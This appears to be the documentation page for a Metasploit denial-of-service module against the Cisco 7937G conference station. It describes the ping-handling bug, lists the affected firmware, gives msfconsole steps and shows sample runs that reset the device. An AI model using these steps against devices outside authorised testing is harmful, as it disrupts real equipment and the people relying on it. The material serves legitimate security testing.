## Vulnerable Application

  [Cisco 7937G](https://www.cisco.com/c/en/us/support/collaboration-endpoints/unified-ip-conference-station-7937g/model.html) Conference Station.
  This module has been tested successfully against firmware versions SCCP-1-4-5-5 and SCCP-1-4-5-7.

### Description

  This module exploits a bug in how the conference station handles executing a ping via its web interface.
  By repeatedly executing the ping function without clearing out the resulting output,
  a DoS is caused that will reset the device after a few minutes.

## Verification Steps

  1. Obtain a Cisco 7937G Conference Station.
  2. Enable Web Access on the device (default configuration).
  3. Start msfconsole
  4. Do: `use auxiliary/dos/cisco/cisco_7937g_dos_reboot`
  5. Do: `set rhost 192.168.1.10`
  6. Do: `run`
  7. The conference station should become nonresponsive and then power cycle itself.

## Options

  No options

## Scenarios

### Cisco 7937G Running Firmware Version SCCP-1-4-5-7

```
msf5 > use auxiliary/dos/cisco/cisco_7937g_dos_reboot
msf5 auxiliary(dos/cisco/cisco_7937g_dos_reboot) > set rhost 192.168.110.209
rhost => 192.168.110.209
msf5 auxiliary(dos/cisco/cisco_7937g_dos_reboot) > run

[*] Starting server...
[*] 192.168.110.209 - Sending DoS Packets. Stand by.
[*] 192.168.110.209 - DoS reset attack completed!
[*] Auxiliary module execution completed
```

### Cisco 7937G Running Firmware Version SCCP-1-4-5-5

```
msf5 > use auxiliary/dos/cisco/cisco_7937g_dos_reboot
msf5 auxiliary(dos/cisco/cisco_7937g_dos_reboot) > set rhost 192.168.110.209
rhost => 192.168.110.209
msf5 auxiliary(dos/cisco/cisco_7937g_dos_reboot) > run

[*] Starting server...
[*] 192.168.110.209 - Sending DoS Packets. Stand by.
[*] 192.168.110.209 - DoS reset attack completed!
[*] Auxiliary module execution completed
```
